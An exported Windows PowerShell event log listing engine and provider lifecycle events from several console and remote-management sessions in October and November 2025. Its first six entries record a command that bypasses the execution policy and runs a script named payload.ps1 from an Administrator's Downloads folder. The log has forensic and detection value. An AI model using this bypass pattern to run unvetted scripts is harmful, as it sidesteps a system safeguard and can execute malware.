Level,Date and Time,Source,Event ID,Task Category
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,11/3/2025 1:23:21 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=d8d59124-f7ab-4554-9bf7-fc8c989f995d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Downloads\payload.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:42 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=469

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=5eb60034-d3e6-4415-a856-c895775764fe
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=5.1.17763.2931
	RunspaceId=5eb60034-d3e6-4415-a856-c895775764fe
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:32 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=29

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=5.1.17763.2931
	RunspaceId=4e5a4c72-d36e-49f3-93ca-ee328d5b99bd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=5.1.17763.2931
	RunspaceId=4e5a4c72-d36e-49f3-93ca-ee328d5b99bd
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.17763.2931
	RunspaceId=2173b14a-f947-489a-9fe7-4da65faeb194
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.2931
	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:48:35 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=59

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=cdf14365-a2b6-4d88-ad29-f331b69c6e34
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:20:21 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=57

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=ee7b61d0-8d79-4ac7-9012-37bcd0fe817c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:19:21 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=55

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=d0e64517-d827-4645-8749-58c5e1589d13
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=53

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=ee7b61d0-8d79-4ac7-9012-37bcd0fe817c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 

Details: 
	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=51

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=49

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=47

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=45

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=43

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=41

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=39

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=37

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=35

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.17763.2931
	RunspaceId=d0e64517-d827-4645-8749-58c5e1589d13
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 

Details: 
	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=33

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=31

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=29

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=27

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=25

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=23

	HostName=Default Host
	HostVersion=5.1.17763.2931
	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine="
